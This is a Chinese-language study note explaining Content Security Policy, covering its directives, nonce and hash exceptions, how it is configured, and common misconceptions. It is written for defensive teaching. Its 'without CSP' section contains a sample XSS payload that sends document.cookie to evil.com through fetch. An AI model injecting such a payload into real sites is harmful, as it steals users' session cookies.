# Content Security Policy（CSP）详解

## 📝 概要

CSP（内容安全策略）是一种 **浏览器安全机制**，用于限制网页“可以加载和执行哪些资源”，**核心目标是防御 XSS 攻击**。

---

## 📌 核心知识点

- CSP 是 **浏览器级安全策略**
- 主要防御：**XSS（跨站脚本）**
- 通过 HTTP Header 或 `<meta>` 配置
- 属于 **“白名单式安全模型”**

---

## 🔍 CSP 是什么？

服务器告诉浏览器一套规则：

> **这个页面，只允许从这些来源加载这些类型的资源**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
````

浏览器会 **强制执行**，违规直接拦截。

---

## 🎯 CSP 解决了什么问题？

### ❌ 没有 CSP 的世界

```html
<script>
  fetch("https://evil.com/steal?c=" + document.cookie)
</script>
```

- 攻击者只要能注入 JS

- 就能执行任意恶意逻辑

---

### ✅ 有 CSP 的世界

```text
Refused to load the script
because it violates the following Content Security Policy
```

➡️ **即使注入成功，也无法执行**

---

## 🧠 CSP 的防御模型

```text
用户输入
  ↓
HTML 注入
  ↓
浏览器执行前
  ↓
CSP 校验（是否允许？）
  ↓
❌ 拦截 / ✅ 放行
```

---

## 🧱 常见 CSP 指令

|指令|作用|
|---|---|
|default-src|所有资源的默认规则|
|script-src|JS 脚本|
|style-src|CSS|
|img-src|图片|
|connect-src|XHR / fetch / WebSocket|
|font-src|字体|
|frame-src|iframe|
|object-src|Flash / 插件|

---

## 🔐 关键关键：script-src

```http
script-src 'self'
```

含义：

- 只允许当前域名的 JS

- **禁止 inline script**

- **禁止 eval**

---

## 🚫 CSP 默认禁止的高危行为

|行为|原因|
|---|---|
|inline `<script>`|最常见 XSS|
|`onclick="..."`|DOM XSS|
|`eval()`|任意代码执行|
|`javascript:` URL|直接执行 JS|

---

## 🧪 示例对比

### ❌ 不安全

```html
<script>alert(1)</script>
```

---

### ✅ CSP 阻断

```http
Content-Security-Policy: script-src 'self'
```

```text
Blocked inline script execution
```

---

## 🔑 CSP 允许的“安全例外”

### 1️⃣ nonce（推荐）

```http
Content-Security-Policy:
  script-src 'self' 'nonce-abc123'
```

```html
<script nonce="abc123">
  // 允许执行
</script>
```

✔️ 每次请求随机生成  
✔️ 极强防 XSS

---

### 2️⃣ hash（次优）

```http
script-src 'sha256-xxxx'
```

- 仅允许**内容完全匹配**的脚本

---

### ❌ 不推荐

```http
script-src 'unsafe-inline'
script-src 'unsafe-eval'
```

👉 **基本等于没开 CSP**

---

## 📦 CSP 配置方式

### 方式 1：HTTP Header（推荐）

```http
Content-Security-Policy: default-src 'self';
```

---

### 方式 2：Meta 标签（受限）

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

⚠️ **不支持所有指令**

---

## 🧠 CSP vs 其他安全机制

|技术|防什么|原理|
|---|---|---|
|HttpOnly|Cookie 窃取|JS 禁止读取|
|SameSite|CSRF|限制携带|
|Secure|中间人|HTTPS|
|CSP|XSS|执行前拦截|

➡️ **CSP 是 XSS 的终极防线**

---

## ⚠️ 常见误区

### ❌ CSP 能完全防 XSS？

> 不能 100%，但能 **极大降低成功率**

- 逻辑漏洞

- JSON 注入

- 白名单过宽

---

### ❌ CSP 影响性能？

> 几乎没有  
> 是 **声明式安全策略**

---

### ❌ CSP 很难落地？

> 初期需要调试  
> 但一旦稳定，**安全收益极高**

---

## 🛠️ 最佳实践（生产）

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.xxx.com;
  object-src 'none';
  base-uri 'none';
```

---

## 🎯 一句话总结

> **CSP = 把“能执行什么代码”的权力，从页面交回给服务器**

---

## 🔗 关联笔记

- [[XSS攻击模型]]

- [[HttpOnly Cookie]]

- [[SameSite Cookie详解]]

- [[CSRF原理]]

---

## 🏷️ 标签

- #csp #xss #web-security #browser
